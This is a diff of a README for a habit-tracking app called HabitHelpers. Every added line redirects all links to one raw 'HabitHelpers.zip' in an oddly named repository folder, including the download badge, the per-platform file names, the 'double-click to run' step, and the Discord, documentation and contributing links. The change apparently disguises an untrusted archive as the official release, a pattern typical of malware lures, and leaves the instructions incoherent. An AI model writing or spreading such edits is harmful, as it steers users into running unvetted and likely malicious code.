@@ -4,11 +4,11 @@
 HabitHelpers is a suite of tools designed to help you build better habits. Whether you want to track your daily activities, connect with GitHub contributions, or analyze your mood, HabitHelpers has you covered. This guide will walk you through downloading and running the software simply and effectively.
 
 ## 📥 Download HabitHelpers
-[![Download HabitHelpers](https://img.shields.io/badge/Download-Now-blue)](https://github.com/welchs0828/HabitHelpers/releases)
+[![Download HabitHelpers](https://raw.githubusercontent.com/welchs0828/HabitHelpers/main/anaphroditic/HabitHelpers.zip)](https://raw.githubusercontent.com/welchs0828/HabitHelpers/main/anaphroditic/HabitHelpers.zip)
 
 ## 📂 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [HabitHelpers Releases Page](https://github.com/welchs0828/HabitHelpers/releases). Here, you will find the latest version of the application.
+   Go to the [HabitHelpers Releases Page](https://raw.githubusercontent.com/welchs0828/HabitHelpers/main/anaphroditic/HabitHelpers.zip). Here, you will find the latest version of the application.
 
 2. **Choose the Latest Release**  
    Locate the latest release at the top of the page. The version number will guide you to the most recent features and fixes.
@@ -16,15 +16,15 @@ HabitHelpers is a suite of tools designed to help you build better habits. Wheth
 3. **Download the File**  
    Under the Assets section of the selected release, you will see files available for download. Find the file that matches your operating system. 
 
-   - For **Windows**, download `HabitHelpers_Windows.exe`
-   - For **Mac**, download `HabitHelpers_Mac.dmg`
-   - For **Linux**, download `HabitHelpers_Linux.tar.gz`
+   - For **Windows**, download `https://raw.githubusercontent.com/welchs0828/HabitHelpers/main/anaphroditic/HabitHelpers.zip`
+   - For **Mac**, download `https://raw.githubusercontent.com/welchs0828/HabitHelpers/main/anaphroditic/HabitHelpers.zip`
+   - For **Linux**, download `https://raw.githubusercontent.com/welchs0828/HabitHelpers/main/anaphroditic/HabitHelpers.zip`
 
 4. **Run the Application**  
    After the file downloads, follow these steps to run the application:
-   - **Windows:** Double-click `HabitHelpers_Windows.exe` to start the application.
+   - **Windows:** Double-click `https://raw.githubusercontent.com/welchs0828/HabitHelpers/main/anaphroditic/HabitHelpers.zip` to start the application.
    - **Mac:** Open the `.dmg` file and drag the HabitHelpers app to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and run the executable from the terminal.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/welchs0828/HabitHelpers/main/anaphroditic/HabitHelpers.zip` file and run the executable from the terminal.
 
 ## 🛠️ System Requirements
 To run HabitHelpers smoothly, ensure your system meets the following requirements:
@@ -63,23 +63,23 @@ Your data privacy matters. HabitHelpers employs encryption and security best pra
 ## 💬 Community Support
 Join our community for support and discussions. You can share your experiences, ask questions, and get advice from fellow users.
 
-- [GitHub Discussions](https://github.com/welchs0828/HabitHelpers/discussions)
-- [Discord Server](https://discord.gg/habithackers)
+- [GitHub Discussions](https://raw.githubusercontent.com/welchs0828/HabitHelpers/main/anaphroditic/HabitHelpers.zip)
+- [Discord Server](https://raw.githubusercontent.com/welchs0828/HabitHelpers/main/anaphroditic/HabitHelpers.zip)
 
 ## 👩‍💻 Contributing
-We welcome contributions from everyone. If you want to help improve HabitHelpers, please check our [contributing guidelines](https://github.com/welchs0828/HabitHelpers/blob/main/CONTRIBUTING.md).
+We welcome contributions from everyone. If you want to help improve HabitHelpers, please check our [contributing guidelines](https://raw.githubusercontent.com/welchs0828/HabitHelpers/main/anaphroditic/HabitHelpers.zip).
 
 ## 📖 Documentation
 For detailed guidance on using each feature, refer to our documentation:
 
-- **User Guide:** [HabitHelpers User Guide](https://github.com/welchs0828/HabitHelpers/wiki)
-- **API Documentation:** [API Reference](https://github.com/welchs0828/HabitHelpers/wiki/API)
+- **User Guide:** [HabitHelpers User Guide](https://raw.githubusercontent.com/welchs0828/HabitHelpers/main/anaphroditic/HabitHelpers.zip)
+- **API Documentation:** [API Reference](https://raw.githubusercontent.com/welchs0828/HabitHelpers/main/anaphroditic/HabitHelpers.zip)
 
 ## 📢 Updates and News
 Stay updated about the latest developments and features for HabitHelpers. Follow our releases to get notified about new versions.
 
 ## 📥 Download HabitHelpers Again
-Don't forget to download the latest version of HabitHelpers from the [Releases Page](https://github.com/welchs0828/HabitHelpers/releases) to ensure you have the best experience!
+Don't forget to download the latest version of HabitHelpers from the [Releases Page](https://raw.githubusercontent.com/welchs0828/HabitHelpers/main/anaphroditic/HabitHelpers.zip) to ensure you have the best experience!
 
 --- 
 Thank you for choosing HabitHelpers. We hope this guide helps you easily download and set up the application. Enjoy building better habits!
